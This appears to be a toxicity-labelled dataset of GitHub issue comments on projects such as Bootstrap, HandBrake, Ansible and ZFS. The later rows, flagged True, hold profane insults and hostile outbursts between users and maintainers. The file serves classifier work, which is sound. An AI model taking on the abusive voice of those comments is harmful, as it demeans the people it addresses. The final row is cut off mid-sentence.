DietPi/Fourdee/1912/403342995,DietPi/Fourdee/1912, 🈴 TM check | no results in UK TM database   ,False,True
vuejs.org/vuejs/974/311727021,vuejs.org/vuejs/974,You should go ahead with a PR and @friend would help you shape it. ,False,True
bootstrap/twbs/24475/338705789,bootstrap/twbs/24475,"Personally, I'd like to skip using React, Preact et all. Thus my choice is to look into Hugo; no extra client side dependencies, no dependencies to run either. I started working on the Hugo switch, it won't be an easy task, but we'll see how it goes.  if you have any suggestions please don't hesitate to try the branch and provide any patches to help move forward with this. ) So far I face the following issues  We need to have Hugo copy the dist dir without us moving it into the static folder; I made an issue in Hugo discourse and I think I'll ask for such a feature in the GitHub repo I can't seem to be able to make shortcodes or highlight to work in index.html;  need to convert the Jekyll plugins to Hugo shortcodes, but that's after I have something working locally first P  ",False,True
bootstrap/twbs/10133/23224762,bootstrap/twbs/10133,@friend &lt;3 ,False,True
zfs/zfsonlinux/7401/379458689,zfs/zfsonlinux/7401,I get a worse situation on latest Centos 7 with kmod ♠[root@friend test]# mkdir SRC [root@friend test]# for i in $(seq 1 10000); do echo $i &gt; SRC/$i ; done [root@friend test]# cp -r SRC DST cp cannot create regular file ‘DST/5269’ No space left on device cp cannot create regular file ‘DST/9923’ No space left on device [root@friend test]# cat DST/5269 cat DST/5269 No such file or directory [root@friend test]# cat DST/9923 cat DST/9923 No such file or directory [root@friend test]# cat DST/9924 9924 [root@friend test]# cat DST/9923 cat DST/9923 No such file or directory [root@friend test]# ls -l DST/9923 ls cannot access DST/9923 No such file or directory [root@friend test]# zpool status   pool storage  state ONLINE   scan none requested config NAME                                            STATE     READ WRITE CKSUM storage                                         ONLINE       0     0     0   raidz1-0                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30KPM0D  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJDDD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJAHD  ONLINE       0     0     0   raidz1-1                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NGXDD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJ91D  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30LN7GD  ONLINE       0     0     0   raidz1-2                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJM5D  ONLINE       0     0     0     ata-HGST_HUS724020ALA640_PN2134P5GAY9PX     ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJD5D  ONLINE       0     0     0   raidz1-3                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJD8D  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NJHVD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30K5PMD  ONLINE       0     0     0   raidz1-4                                      ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30NLZLD  ONLINE       0     0     0     ata-Hitachi_HDS723020BLA642_MN1220F30MVW4D  ONLINE       0     0     0     ata-HGST_HUS724020ALA640_PN2134P5GBBL9X     ONLINE       0     0     0 logs   mirror-5                                      ONLINE       0     0     0     nvme0n1p1                                   ONLINE       0     0     0     nvme1n1p1                                   ONLINE       0     0     0 cache   nvme0n1p2                                     ONLINE       0     0     0   nvme1n1p2                                     ONLINE       0     0     0`  I ,False,True
TotalFreedomMod/TotalFreedom/2004/392328680,TotalFreedomMod/TotalFreedom/2004,Now we no longer have Clanforge is this still an issue? ,False,True
screensaver.asteroids/notspiff/9/303284991,screensaver.asteroids/notspiff/9,The header paths seems like a regression. Why include kodi in them? And that nasty .. hack is also a bit poo ,False,True
Carthage/Carthage/2529/407570456,Carthage/Carthage/2529,"I am very new to the project and I am grateful to be able to contribute to Carthage and have the chance to express my opinion. I have started using Carthage when it was in it's infancy and I feel very attached to it. It's a tool I love and endless source of learning opportunities for me. As much as I want this to be true, it don't think it will. See Maven &amp; Gradle, Cabal &amp; Stack and the countess Javascript build tools. Just my two cents. Yes, so I think being pragmatic here is paramount Agreed Yes.  In the mean time though the community needs a solution, Swift build times are overall excruciating. A few solutions I see are  Clone problematic repos and delete the unwanted schemes. This is high maintenance for the users. Think of agencies. 6 month and everyone is out of the project. Now the client has to maintain the fork someone else made. Accept #1990 with changes to the problematic parts. Carthage provides hooks to run scripts at certain points of the cycle Exclude schemes via custom carthage variables passed in via   Definitely. However I think Carthage can be more. Also SwiftPM has no support for iOS, tvOS, or watchOS. From the github readme Ok. Good idea. This might be a long way down the road and it might not happen at all. #1990 is not perfect, I agree on that. I also think that contributors are more than willing to fix it though. More specifically  lack of project &lt;-&gt; scheme association (but hey, if you call your scheme  ... you're kind of asking for it) use of custom format for the ignore (would prefer YAML or json)  Overall I think that this is a very real problem. Just like the  the blacklisting does not travel upwards so there is no risk for other consumers. It's it true that this might not me a Carthage problem to solve, but I would also say that there are many other problems, starting with the last of strict rules on how developers set up their projects, that carthage makes it's own. The complexity added by this change is negligible in my opinion. If users want to shoot themselves in the foot by misusing the feature and excluding schemes needed by some transitive dependency, I think carthage should let them do so. The tool should not prevent a behavior, in my opinion desirable, just because it could be misused. In the end one can always . ",False,True
-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183/336263418,-DEPRECATED-PLEASE-USE-exercism.io-REPO-v2-feedback/exercism/183,"Reference  you read this without a copy/paste to an editor ?  I can't. The old interface has a 'widen button' that hide the comment.  I liked that.  I seemed, at the time, like a clever piece of ergonomics not a Plan D bodge (kludge). I can't widen the solution box.  The whole Exercism uses only half my screen width.  How much technology have I at my finger tips ?  Is this really the ergonomic best we can do ? Copy/paste just to read a solution is not consistent with giving quality assistance on a budget of an hour a week. ",False,True
code-d/Pure-D/29/223070280,code-d/Pure-D/29,No I think this issue is on the workspace-d site and has something to do with the OS buffering ,False,True
bootstrap/twbs/3057/6797473,bootstrap/twbs/3057,"Just reply with ""unsubscribe"" in all caps ",False,True
openDCIM/samilliken/1114/450222330,openDCIM/samilliken/1114,"and when the group search fails, that loop will return nothing, because it's searching for groups based on CN, not UID in a rfc2307 schema. ",False,True
lxqt/lxqt/1628/441121010,lxqt/lxqt/1628,"btw - ubuntu has the same ""problem"" - hard overriding the xdg-upstream defaults and complaining about the same - they decided to set the xdg path in the session - but thats not the way we will go as upstream. ",False,True
bootstrap/twbs/24475/340163554,bootstrap/twbs/24475,"@friend about the dist folder, I just added a step in our scripts which should do the job for now. That being said, I do see something inconsistent between Windows and the Travis builds On my Windows dev VM I get So, I think it's  to blame. After that is fixed I will try moving the config files in root and make use of the  section, which when I last tried it I couldn't make the regexes to work at all. Now, I don't mind replacing many stuff, that is why regex exists. ) What I mind, is if we can use directly variables like we do now. Of course we'll need some shortcodes, I already added a couple to replace the Jekyll plugins. As for going through with this, I don't see any reason not to, as long as we can do things with the same ease like we did with Jekyll regarding the variables and content. Anything else we will face, I'm pretty sure we will be able to find a solution. @friend are you OK with the changes so far? ",False,True
jenkins/jenkinsci/2355/219527135,jenkins/jenkinsci/2355,I think this one is better. I think a compatibility issue is not a big deal since it's a critical regression ,False,True
bootstrap/twbs/3057/5141843,bootstrap/twbs/3057,"@friend wow, that's a great shed haha ",False,True
Semantic-UI-React/Semantic-Org/2550/374248023,Semantic-UI-React/Semantic-Org/2550,"@friend I have some time blocked out tomorrow afternoon to tackle . Do you mind if I just add those commits into your PR branch? If I have the time I may also be able to tackle . I think there were a LOT of additions in this new version of FontAwesome so that might take a while, but I have not looked into seeing if there is an easy to parse list in the CSS on SUI somewhere yet. ",False,True
ansible/ansible/13262/272990897,ansible/ansible/13262,plus one It would be amazing if this feature gets added. ,False,True
coc.nvim/neoclide/305/450468763,coc.nvim/neoclide/305,"I suppose it could be figured out from contents of selection, even more if it contains complete-item  with some form of id. ",False,True
WarBugs/WarEmu/13182/456564568,WarBugs/WarEmu/13182,Hm strange - thanks for the feedback. ,False,True
bootstrap/twbs/3057/5137415,bootstrap/twbs/3057,"tl;dr use Coffeescript if you don't want semicolons. Semicolonless Javascript is an ego-stroking attempt at rejecting standards for the sake of rejecting standards, not for the greater benefit of the community. While the need for hacks exists just to get around using semicolons, the practice does greater harm than good. ""Use semicolons at the end of a statement"" is a far simpler rule than ""never use semicolons, except sometimes you have to use x hack, like prefixing with a !."" All this for the benefit of an opinionated aesthetic? I propose that one might as well use Coffeescript instead, if the intent is prettier code by standards set as a lack of syntactic symbols. Or, just write clean, standard (as defined by not just the specification, but as defined by the developer community) Javascript, if it is to be shared, used, and contributed to by the greater community. ",False,True
Semantic-UI-React/Semantic-Org/2550/374723834,Semantic-UI-React/Semantic-Org/2550,There is a message for Modals in 2.3.1 ,False,True
nokogiri/sparklemotion/1709/360836510,nokogiri/sparklemotion/1709,Windows Ruby 2.5 build is up and running ,False,True
asynqp/benjamin-hodgson/15/107268457,asynqp/benjamin-hodgson/15,Closed by #19 ,False,True
Ant-Media-Server/ant-media/579/445741131,Ant-Media-Server/ant-media/579,"Hi @friend, any news from the team? ",False,True
jekyll/jekyll/6948/383799753,jekyll/jekyll/6948,"I know that this is markdown and not necessarily jekyll related, but my life would have been a thousand times easier if jekyll supported inline footnotes like so  ‘[^Footnote, p. 123]’ as apposed to the more tedious ‘’’ This is first reference1, this is the second2 ‘’’   Footnote, p.1&#8617; Footnote, p.2&#8617;   ",False,True
termux-packages/termux/2735/412879894,termux-packages/termux/2735,@friend a little info about machine is requested.  Are you using the latest Termux packages? ,False,True
rust/rust-lang/7803/16774829,rust/rust-lang/7803,"I'm surprised that I was unable to find an open issue for this. Read  for the basic idea. From what I understand the general attitude is favorable, but people have yet to decide whether to salvage the  sigil or to require  to now be written . Let's try to defer these syntax decisions and just get GC-in-a-library working as soon as possible, if people agree that it is desirable. Nominating for 0.8. Aggressive, but I feel like we're going to suffer if we try to put this off for too long. ",False,True
bootstrap/twbs/8662/21673707,bootstrap/twbs/8662,"@friend let me know I probably came off as an ass there, so let me apologize for that and explain my (unclear) sarcastic comments. I'll try to avoid doing this in the future so they're no confusion. Yes, we really are serious—the gradients are gone. Some shadows still exist—e.g., active button states—but largely the embellishments have been removed. The intention is to enable easier overrides and customization for folks who treat Bootstrap as a first-step, not an end solution. None of these changes in v3 are terrible, and that subjective feedback doesn't help us much unfortunately, so we can't really act on it to help you. It's opinion, not constructive criticism. If there's something we can do better, tell us directly what and how. That's good and useful feedback. Being told ""How dare you!"" suffers the same problem—it's not useful or constructive to us improving anything in Bootstrap. And seeing how this is a project we created, one that we have poured thousands of hours into over the last two years, I dare say we have the right to do what we like with it. That's not intended to show arrogance—it's simply a project we maintain and iterate on with the community's help, and I think our strategy of design/development has worked out quite well for us and everyone else using Bootstrap. Lastly, I truly am saddened that you're not excited (I am!), but once again, being told something like that doesn't help us at all. Similar to some folks' approach to product design, we're not in the business of trying to appease one single user's emotional feedback. It simply doesn't scale and isn't actionable at all. It sucks, but if that's your attitude, you can bet any hope of feedback you're trying to share will be ignored. Again, apologies for any offense given and hope that helps elaborate on my previous comment. &lt;3 ",False,True
Skript/SkriptLang/1568/425710698,Skript/SkriptLang/1568,thank you for breaking my server ,False,True
SickChill/SickChill/5159/435594914,SickChill/SickChill/5159,@friend Many thanks for the clarification. I'll make my vote shortly (very happy to keep things secure). And great work by the way... So glad to be back with you guys on this repo. I continue to be impressed with your application and development. 10/10! ,False,True
ansible/ansible/13262/202493543,ansible/ansible/13262,@friend That comment from @friend is only about current functionality. This is a feature request to allow looping over blocks (meaning with_items and other types of supported loops) ,False,True
AKS/Azure/132/435675348,AKS/Azure/132,"Welcome home, November -) ",False,True
bootstrap/twbs/3057/5454582,bootstrap/twbs/3057,"Mr. Madison, what you've just said is one of the most insanely idiotic things I have ever heard. At no point in your rambling, incoherent response were you even close to anything that could be considered a rational thought. Everyone in this room is now dumber for having listened to it. I award you no points, and may God have mercy on your soul. ",False,True
sdk/dart-lang/19223/84581518,sdk/dart-lang/19223,"This issue was originally filed by osstek...&#064;gmail.com  What steps will reproduce the problem?  Create new project &quot;Web Application&quot; Set breakpoint line 4  &nbsp;&nbsp;querySelector(&quot;#sample_text_id&quot;) Run in Dartium  --- 54318 PM Starting pub serve  sampleweb --- Loading source assets... (0.5s) Serving sampleweb web on  completed successfully [web] GET /sampleweb.html =&gt; sampleweb|web/sampleweb.html [web] GET /sampleweb.dart =&gt; sampleweb|web/sampleweb.dart [web] GET /sampleweb.css =&gt; sampleweb|web/sampleweb.css [web] GET /packages/browser/dart.js =&gt; browser|lib/dart.js  OnBreakpoint, hover cursor line 6 variable &quot;reverseText&quot; ..onClick.listen(reverseText);  What is the expected output? What do you see instead? &lt;debug target crashed&gt; What version of the product are you using? On what operating system? Windows 2008 Server SP2 64-bit Dart Editor version 1.5.0.dev_04_00 (DEV) Dart SDK version 1.5.0-dev.4.0 Dart VM version 1.5.0-dev.4.0 (Wed Jun 04 013007 2014) on &quot;windows_ia32&quot; Chromium Version 36.0.1985.0 (272160) Please provide any additional information below. ",False,True
react/facebook/7245/231963851,react/facebook/7245,"Yes, we run tests with development CommonJS build. Rollup would solve this because we can move requires back to the top of the file (like Jest prefers) but it would still eliminate dead code in prod. Browserify is not that smart which is why I inlined them, but I won't have to after switching to Rollup. ",False,True
i2cdevlib/jrowberg/252/311864425,i2cdevlib/jrowberg/252,"I have similar situation. My current setup includes a generic MPU6050 (probably a GY-521) and a Dual h-bridge motor driver board and Arduino Pro mini running at 5volts/16mhz. I am using Jeff's library and it works well without the motors running. I am using DMP to get the values from the Gyro. However problems seemed to come when the motors already turned on. At first I tried to eliminate the problem's cause. My first guess is that it's due to the motor's noise that's causing the MPUs erratic behavior or freeze. When running the MPU with the Motors turned on, the longest I can get is about 15 seconds and it seems I am blocked somewhere in an infinite loop. The motors are still running but I could not make it react using the IR sensors and if I pull off the MPU during the run, the functionality of my motors' feedback system resumes.  So I suspect that it's the motor driver that's causing the erratic behavior of the MPU. But here's the interesting thing, when I used the code from here  using Jeff's library), in fact it's also using the Wire.h. I integrated my motor functionalities into the new sketch to see if both MPU and the motor runs, then I was able to make it work it runs indefinitely without MPU readouts freezing. In conclusion to this finding, it's Jeff's library that's causing the problem. ",False,True
core/owncloud/8282/41006176,core/owncloud/8282,"Hi, this issue has a temporarily solution by someone.  Windows system zip does not fully support utf-8, I don't know if Linux system has this problem. Actually there is something in the Zip file but Zip just can't read the utf-8 names. You can use other software instead. (Help translate the web site.) Method 1 In the web site, someone modified the lib/files.php  by adding ""iconv"" before zipping Chinese file names. But I've test this method and found that it may cause another problem is that the problem will still exist if you try to convert other language file names not belong to this encoding. Method 2 They just simply use the unzip software that supports utf-8 when unzip such as bandzip. ",False,True
react-devtools-experimental/bvaughn/83/430068128,react-devtools-experimental/bvaughn/83,"I think this helps explore what exactly you're trying to select, as well get a general sense of the hierarchy. To reduce the noise, I throttled the highlighting by 200ms. That also helps avoid highlighting too early when you're just moving the cursor from the panel into the app. ",False,True
lxqt/lxqt/1628/441442638,lxqt/lxqt/1628,Qt has  and it knows the hierarchy once env is set. Implementing another logic would be wrong because it would create unnecessary complications. ,False,True
shlink/shlinkio/210/422335696,shlink/shlinkio/210,"I freshly set up a host with a fresh 7.2 php install. My server has 7.0.30 as lowest php installation and the package I am using for shlink is using 7.2.10 FPM, should I maybe use 7.2.10 FastCGI? ",False,True
termux-packages/termux/2735/413338513,termux-packages/termux/2735,"@friend you have asked me to promote Termux at Wikipedia, and you delete our efforts at Google+!  Why? ",False,True
grunt/gruntjs/1646/404888454,grunt/gruntjs/1646,"Also the problem is in the  plugin, not in core. Per ",False,True
Elgg/Elgg/12126/434064103,Elgg/Elgg/12126,"@friend and @friend any feedback with regards to the changes I made to get the upgrade working? Could they be implemented in some way? I'm not sure the issues are strictly MariaDB only, especially the SET GLOBAL problem could also occur with any DB server install without global permissions. If innodb_large_prefix would be ""ON"" anyway it wouldn't be necessary to set it. Though in this case it might be necessary to check this early during the upgrade process (which is beyond my skills whereas I could make a PR for the rest). ",False,True
hoverfly/SpectoLabs/821/476097223,hoverfly/SpectoLabs/821,"Hi John, Please help me to find the example for hoverfly-java for checking the status of service and change mode accordingly. This is very urgent for me. Thanks and regards, Antika On Thu, Mar 21, 2019, 610 PM antika chauhan antikachauhan2@friend.com wrote ",False,True
ansible/ansible/13262/329247394,ansible/ansible/13262,"Well since I implemented almost the exact same thing in Ducted I know it certainly solve a lot of problems to just snap off that part of the yaml tree in your preprocessor then take the parent block and duplicate it back into the tree as ordered siblings which retain sequencing. If you cared particularly about ordering over short hand grouping, and are sure you don't have giant sets, then I guess you can unroll the loops at that point. But to be clear as well if the engine is broken enough to require unrolling loops in the preprocessor, or ludicrous (like, Java level) amounts of forced decoupling through deeply nested include trees (not sure how that is more efficient than using the already parsed yaml tree? but I digress) then if the best argument is that it's currently too much work and there are higher priorities to me is a signalling risk of product management failures, because putting effort into those higher priorities will only move the goal post of fixing the engine even further away. That is a concern. ",False,True
bootstrap/twbs/9643/22733916,bootstrap/twbs/9643,For now I'm going to leave this since those are two different nav lists. ,False,True
i2cdevlib/jrowberg/252/241637206,i2cdevlib/jrowberg/252,"This is not a bug - your loop is taking too long, and the buffer in the IMU is filling up and crashing the I2C bus/processor. That's why removing Serial prints and reducing delays (as you mention in your Arduino forum posts) solves the problem. That's why switching the code to check the FIFO will work. It manifests in many ways. Jeff has written repeatedly in his documentation to check the buffer as often as possible - adding a delay(100) is the opposite of that. In my experience, you need to check the buffer at least every 12ms to long term stability, but the faster the better. You should close this bug report. ",False,True
forum/standardnotes/39/433695286,forum/standardnotes/39,plus one for this feature ,False,True
system_tests/ros2/56/148218906,system_tests/ros2/56,Related to my other comment ( I would think testing the functionality of the core functionality is enough. For the syntactic sugar API a simple test checking that a specific signature works would be enough. ,False,True
framework/laravel/25212/463200154,framework/laravel/25212,Couldn't agree more ,False,True
A3-Antistasi/A3Antistasi/57/393819419,A3-Antistasi/A3Antistasi/57,"If you want to make it quicker you can allways provide the code here and I Will implement it in seconds. And if not, after telling you that I Will do, you come here with hurry and get dissapointed because I tell you the priorities of the mission development????? May I say that I am not your fucking slave or is it incorrect? ",True,True
ARKStatsExtractor/cadon/850/446795711,ARKStatsExtractor/cadon/850,seriously? cuz you are asking for help and im telling you something might help and you question it. dont expect anything further from me as you cant seem to bothered you even help yourself without being an ass ,True,True
ARKStatsExtractor/cadon/850/446810586,ARKStatsExtractor/cadon/850,"Assuming you made 100% false assumptions, this is something that has only just happened. I don't have any issue with any other Dino being tamed and it is only the Tex Rex at this stage that I have noticed it with. The current level is its post tamed level and I do indeed have a 100% tame on it. Like I said all the GREEN parts are 100% correct, I DO NOT HAVE ANY ISSUE WITH THE SPINO'S that I have added, I DO NOT HAVE ANY ISSUE WITH THE NORMAL REX'S that I have added. And this was not an issue a few months ago, so why is it an issue now!!! And I DON'T SEE WHY I NEED TO POST A SCREEN SHOT OF THE STATS WHEN THEY ARE 100% CORRECT. Seriously the support from everyone but the author  is becoming a joke in here now. ",True,True
ARKStatsExtractor/cadon/850/446811141,ARKStatsExtractor/cadon/850,"And instead of arguing about what I haven't show, when I have been suing this program for 3 years and never had issues on my server to this extent, that I am dealing with people who refuse to acknowledge that I have stated the GREEN sections in the image are exactly what is on this Tek Rex. But you know what I should post it just to show how much time has been wasted chasing something that is not even the issue. ",True,True
ARKStatsExtractor/cadon/850/446812317,ARKStatsExtractor/cadon/850,the servers wild level is 300 and I am very well aware how that all works. Seriously!!!!!!!!!!!!!!!! ,True,True
ARKStatsExtractor/cadon/850/446812998,ARKStatsExtractor/cadon/850,"And because you are not listening and going on some wild tangent rant about what you think Here is a list of Dinos, tamed and show the correct Wild Level  ",True,True
Aether-Legacy/Modding-Legacy/341/458447977,Aether-Legacy/Modding-Legacy/341,no they spawn directly in front of you same for alot of the mobs you made a crappy port I am tempted to make my own port ,True,True
Ant-Media-Server/ant-media/579/454181430,Ant-Media-Server/ant-media/579,"Hi @friend, thank you for reaching back to me I have to say I am a bit surprised by your team answer though. Did you consider the security risks associated with the current state of your software? If all Community Edition deployments and Enterprise Edition streams that do not use the Token Control feature are vulnerable to stream hijacking, I believe you have a responsability to fix that. Your current stance is ""our software is insecure, but you can enable a paid option to make it secure"". And even when paying, the token thing is still optional! That's simply not acceptable, especially since you're not advertising this huge security risk anywhere. We're not talking about enhanced, nice-to-have security here (like with two-factor authentication which could be a paid option only), it's about basic, indispensable security for publishers and viewers! Thank you for the code samples, but there is no point in implementing a workaround to secure your software if you're not planning to secure it yourself in the end. If it's really that simple, to fix, I think your team should take an hour or two to implement this fix and protect all the people using your software. ",True,True
Contentify/Contentify/398/338891837,Contentify/Contentify/398,"So I installed this for a friend, and already at the installation I noticed that much stuff doesn't work. The current release version has errors with the apache_get_modules function, which is disabled due to security reasons, the script wants access to the php main directory, which a php script NEVER should have access to. And after I gave him all this, I just get that  What the hell. ",True,True
Contentify/Contentify/398/402999274,Contentify/Contentify/398,Ok I found the mistake. Ever heard of case sensitive? Apperently not ,True,True
Contentify/Contentify/398/403030035,Contentify/Contentify/398,And also thank you for being in the EU and not following the laws. Read it up kiddo DSGVO ,True,True
Contentify/Contentify/398/403034224,Contentify/Contentify/398,"No I blame you that since more then 24 hours I have nothing but problems with this. And that just because you didn't wrote a capital C , but instead a lowercase one ",True,True
DSharpPlus/DSharpPlus/282/321360868,DSharpPlus/DSharpPlus/282,"You guys harassed me over PascalCase with ""someone"" being verbally abusive and saying I needed to get help because I showed him my programming trophy. Being rude is one things, being delusional is worse. I get it. You guys got intimidated by me but stop making up shit. ",True,True
FastAdapter/mikepenz/695/401866844,FastAdapter/mikepenz/695,"@friend , I just make a joke, i know that no need for clarification, i just need when add item, delete or move in real time (not added to array first) to make the adapter automatically sort those damn items , i am really sad with that. ",True,True
GRDB.swift/groue/261/389190437,GRDB.swift/groue/261,"Wow @friend, Didn't expect such responses as you posted and then giving some hint afterwards. You should work on your attitude pal! Cheers! ",True,True
Ghost-CLI/TryGhost/678/374471992,Ghost-CLI/TryGhost/678,"It's obviously not a  password ask and I am not asking for support. I don't know if it's your ignorance or lack of basic knowledge, but it's clearly a cli bug, most likely in . ",True,True
GoMint/GoMint/406/434019763,GoMint/GoMint/406,"The fuck are you talking about? You are saying you want more threads, so i'm asking you what you want those threads to be for. If you don't know what you want them to be for, then you are just another 5 year old shouting for something to be added because it sounds good. ",True,True
HandBrake/HandBrake/1517/410392065,HandBrake/HandBrake/1517,"I've been a developer for 30 yrs (not open source where nobody can fire me) and all I can say is WOW.  I'll be sure to spread the word I had no idea HB's stance was who cares if source media can be properly read and if we can't catch ALL general failures, literally why would we test for ANY of them - even the most basic PROGRAM INPUT testing.  This is basic friggin I/O, not rocket science and you coded enough to log the issue, someone made a very irresponsible call to not call a total FAILURE TO READ SOURCE only 30 seconds in a success.  I hear Twilight Zone music. ",True,True
HandBrake/HandBrake/1517/410419756,HandBrake/HandBrake/1517,"And FYI, this has ZERO to do with the PHYSICAL media it is hilarious that was the first defensive knee-jerk reaction to make this go away and close it.  HB doesn't even make low-level I/O calls the failure is in the reading of the actual source file regardless of where the heck it sits.  Copy a corrupt source file, any source file to the hard drive and Handbrake simply is coded so poorly that corrupt source file that fails to read, will not properly fail the job - period.  I just tried it by hex-editing a source file to corrupt it and HB did the exact same thing.  It is fully reproducible and to simply close this issue is absolutely unbelievable. ",True,True
HandBrake/HandBrake/1517/410421888,HandBrake/HandBrake/1517,"I understand you're frustrated. Regardless of the issue, you're being an ass. HandBrake is open source, free software, and nobody owes you anything, despite our efforts to provide support in our free time. I'm going to leave these here and lock the issue. Please consider them and if you don't feel like changing your attitude, please go away. ",True,True
HandBrake/HandBrake/1584/435210788,HandBrake/HandBrake/1584,"@friend We didn't ""go through it"" this time. You just closed it without even reading. If you had, you would have realized that every single one of the usability concerns brought up originally ended up never materializing. I haven't had a single user complain and ask to bring the settings back into the main window. At least now I know with certainty that making my own UI was the right thing to do. It's infuriating dealing with people who tell you ""that's bad UI"" without a single valid reason to back it up. And who, when politely challenged simply reject, ignore and lock rather than discuss in good faith. ",True,True
PocketMine-MP/pmmp/1945/359199958,PocketMine-MP/pmmp/1945,"Let's remove anti-cheat motion, which delivers more of a pain in the ass. After all, it is also possible to add a plugin. ",True,True
PocketMine-MP/pmmp/2187/390038360,PocketMine-MP/pmmp/2187,Okay then fill out that long ass template just like we have to do rather than just taking a shortcut. ,True,True
RasPlex/RasPlex/562/379350509,RasPlex/RasPlex/562,"Nobody listen to this fucking repo ( On Fri, 6 Apr 2018, 1953 Joseph Weigl, notifications@friend.com wrote ",True,True
Sabaki/SabakiHQ/341/368529038,Sabaki/SabakiHQ/341,"@friend Perhaps you have a suggestion instead of criticizing with a quote from a 16 year old book? (Actually, the book is 30 years old. I wouldn't be surprised if things have changed since then. But then again, I haven't read that book, so I can't say for sure.) Previously, the button would only display 'Done', but I changed it so it would display useful information instead of just being a waste of space. Also, the data for both area and territory are visible, just the end result changes when you toggle between them. I agree there is a property for specifying the ruleset, but it shouldn't have an effect on someone who edits the game. That's what I meant by 'no concept'. It's only there for reference purposes, like game name/date, handicap stones, and copyright. That said, we could display the value of the property somewhere in game info. ",True,True
Sabaki/SabakiHQ/341/368690688,Sabaki/SabakiHQ/341,"Anyway, to simplify this thread  Area      [W+50.5]    Toggle group status     [x] Territory [W+45.5] Don't like it since it takes up two lines instead of one.  Also, if the score has already been calculated, there is no need to calculate it again with the scoring tool.  Not sure what else to say. Scoring the game only makes actual sense if it is your own game, since finished SGF files already have the score in its result field. One can take an SGF file and start playing from somewhere in the middle with an engine and score the game their way.  I think the best way to avoid the double concern is to let the button show 'Details' and have another label to show the score for those who don't realize the 'visual affordance' I put into the button. In any case, I wanted some good reasoning to do something, not just a quote or a reference or whatever to a 'well-known researcher'. Controls which have more than one function are quite common nowadays. It's a great way to provide functionality without cluttering the UI. You just have to look at Apple's iOS, well-known for its design and UX.   While I appreciate everyone who takes their time with my projects, your second post wasn't constructive criticism at all despite your flimsy justifications and hit a nerve. Especially by referencing a book to avoid giving any reasons yourself raised a red flag in me. ",True,True
SevTech-Ages/DarkPacks/2607/391451401,SevTech-Ages/DarkPacks/2607,this forum sucks ass ,True,True
SevTech-Ages/DarkPacks/2977/335083459,SevTech-Ages/DarkPacks/2977,"     Context I am trying to give feedback on what the pack is like for a new player, who has not played it before. I suspect that you have gotten so familiar with the pack that you don't even think about the experience of a new player. The most important player you have is the new player. If you do not get new players, you wind up with a declining population and eventual nothingness; additionally, new players recruit other new players. As a new player, this is what I have seen, that really seems to define the pack for me Go to a kitchen counter (you can do this as a thought experiment if you want), and clear a meter square surface. Use some tissue paper (or toilet paper), and divide it into 1' x 1' squares. Stand in front of it. Now, keeping your eyes straightforward, move your neck to where you are looking around at all 9 spaces. Notice how much head movement you have, notice how much work is involved. Now, just look at the whole table, and move your hand around all 9 spaces. Notice how much easier it is? This is without taking into account that the mouse movements needed to aim where you are looking at for the 3 spaces closest to you are actually much more exaggerated than for the others. An ""in-world crafting table"", or ""non-GUI interface"" is not ""more realistic"". It is denying the use of hands to do things. It is taking the worst choices of the interface and controls of Minecraft and magnifying their effect. And it completely eliminates the concept of saying, ""I'm focusing on the crafting table, I'm using my hands to place things on the table, and I'm going to look things up in the recipe book"". Good or bad, you have basically chosen to document the modpack and its recipes with JEI. And that documentation is lost as soon as you are using the work stump. The mod page for primal tech (work stump mod) claims that it has JEI support. Yet I don't see it in play. Now, let's look at these work stump, wooden hopper, chest, shelf (cupboard), water strainer. The basic operations on stores of inventory items are deposit one, deposit stack, remove stack, remove one, remove half stack. The documentation for what key/mouse commands do what is nonexistent. Each block seems to have a slightly different set of controls than the other blocks, and none of them are documented. If you make a mistake with the water strainer (taking out too much), you can't put the others back. If you try to take one repeatedly from either the wooden hopper, the chest, or the shelf you wind up placing the block that you just took out (because the control used is shift-place). Etc. (and why does the water strainer have an inventory GUI when nothing else at this tech level does?). ""Nonintuitive"" only begins to describe the pain of this system. I haven't even gotten to the strangeness of saying that there is an item you can craft at tech level tutorial that includes an item you can't understand, that can be made ""in hand"" in your 2 x 2 but not on the work stump. All of these ""in world"" non-GUI blocks essentially restrict you to only those items that you have room for in your hot bar. None of the rest of your inventory space is usable. My hot bar is almost always nearly full in normal play, and even so far in the pack I don't have much space in it. I want to bring up the issue of the chopping block again. I complained about the behavior of the chopping block. I was told, ""You tap attack on the chopping block..... stop wasting our time with these issues use discord...."". Nowhere in the documentation that I saw -- not the pages for the mods, not any instruction in the achievement tree, no tooltips for the chopping block, nothing -- is the ""tap attack"" mentioned. And this is so much in line with everything else in Minecraft, that you see this tap attack used ... to pick up mine carts. And I think only to pick up mine carts. It isn't the norm, I am used to other mods that distinguish between your activities based on where you are pointing at -- heck, vanilla will rely on where you are aiming when it comes to placing stairs or slabs -- and to have my ""bug report"" (and the behavior did seem very buggy and exceedingly nonobvious) dismissed and closed with that remark seems very much ""anti-new player"". And ""stop wasting our time""? Do you have any idea how much time I have been spending trying to find something worth playing in this pack? Do you have any idea how much time I'm spending reporting the problems and flaws I'm running into as a new player? Do you have any idea how much time anyone else that tries to pick up this pack is going to spend trying to deal with the interface strangeness? My observation so far is that while there appeared to be a very large amount of things to do in tech level tutorial, the reality is that the arrangement of the achievements is highly misleading, and tech level tutorial is really tiny; most of it is actually tech level 0. But even in zero, while there appears to be many things to do, all that really matters is the ""advanced to the next tech level"" path. Let me repeat that I am being trained, early in the game, that all that matters is advancing to the next tech level, and everything else at any given stage of the game is pointless. You have gone to a great deal of effort to make these tech levels, put content in them, and all I am learning is to skip them as quickly as possible. That's just bad. I like the idea of a detailed progression pack, complete with an actually complete progression chart. The last time I saw something like this was Jaded's packs. (My only exposure to non-vanilla skyblock was agrarian skies, and an entire section of her quest lines was 